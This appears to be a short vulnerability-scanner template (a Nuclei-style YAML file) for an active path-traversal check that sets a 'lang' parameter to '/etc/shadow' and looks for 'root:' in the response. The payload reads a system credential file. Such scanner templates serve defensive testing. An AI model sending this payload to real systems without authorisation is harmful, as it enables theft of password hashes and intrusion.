id: lfi2-038
name: 'Path traversal2 via lang'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via lang'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      lang:
        - '/etc/shadow'
    matchers:
      - type: word
        part: body
        words:
          - 'root:'
